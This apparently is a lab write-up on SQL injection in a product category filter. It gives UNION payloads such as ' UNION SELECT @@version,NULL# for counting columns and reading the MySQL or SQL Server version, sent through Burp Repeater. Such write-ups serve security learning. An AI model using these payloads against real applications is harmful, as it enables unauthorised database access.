# SQL injection attack, querying the database type and version on MySQL and Microsoft


## Concept


The application contains a SQL Injection vulnerability in the product category filter.


The goal is to use a UNION attack to retrieve the database version.


---


## Vulnerability



The category parameter is directly included in a SQL query without proper sanitization.


Example:



```sql

SELECT * FROM products 

WHERE category = 'Gifts' AND released = 1

````



---


## Exploitation Steps


### 1. Confirm SQL Injection



Test:


```sql

'

```


An SQL error appears, confirming that user input affects the query.



---


### 2. Find Number of Columns


Use UNION with NULL values:


```sql

' UNION SELECT NULL,NULL#

```


Adjust the number of NULL values until the query executes successfully.



---


### 3. Retrieve Database Version


The database type is MySQL / Microsoft SQL Server.


Use:


```sql

@@version

```


Example payload:



```sql

' UNION SELECT @@version,NULL#

```


or:


```sql

' UNION SELECT NULL,@@version#

```


depending on which column is visible.

---



## Burp Suite Usage


The request was modified using Burp Repeater to test UNION payloads and observe responses.


---


## Key Takeaways


* UNION attacks require matching the number of columns.

* The extraction method depends on the DBMS type.

* MySQL and Microsoft SQL Server can use `@@version` to retrieve database version.

* Burp Repeater helps modify requests and analyze responses.
